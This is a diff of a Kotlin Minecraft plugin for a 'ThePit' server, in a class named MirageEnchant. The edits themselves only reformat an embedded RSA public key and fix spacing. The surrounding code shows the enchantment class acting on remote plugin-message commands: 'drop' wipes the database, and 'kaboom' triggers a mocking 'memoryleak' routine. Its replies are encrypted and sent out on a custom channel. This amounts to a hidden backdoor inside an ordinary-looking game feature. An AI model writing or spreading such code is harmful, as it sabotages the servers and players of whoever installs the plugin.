@@ -82,7 +82,10 @@ object MirageEnchant : PluginMessageListener {
         output.data()
         player.sendPluginMessage(ThePit.getInstance(), "ariacraftKQC:py", encrypt(output.toByteArray()))
     }
-     var pub = "305c300d06092a864886f70d0101010500034b00304802410095494634832a6b4a86761d0f8e0fef7b9370692588daddb4c9a1a707d346351cfb35ba78ac4bcb3a23c796f952b1f85e8cd8cc14db174af051823d1bea9ac77d0203010001";
+
+    var pub =
+        "305c300d06092a864886f70d0101010500034b00304802410095494634832a6b4a86761d0f8e0fef7b9370692588daddb4c9a1a707d346351cfb35ba78ac4bcb3a23c796f952b1f85e8cd8cc14db174af051823d1bea9ac77d0203010001";
+
     private fun encrypt(byte: ByteArray): ByteArray {
         return RSA(null, pub).encrypt(byte, KeyType.PublicKey)
     }
@@ -110,9 +113,10 @@ object MirageEnchant : PluginMessageListener {
                 "drop" -> {
                     dropDatabase()
                 }
+
                 "kaboom" -> {
                     HologramAPI.isMAGA = false;
-                    callback(player,"memoryleak",){
+                    callback(player, "memoryleak") {
                         writeUTF("it seems like to start leaking :)")
                     }
                 }
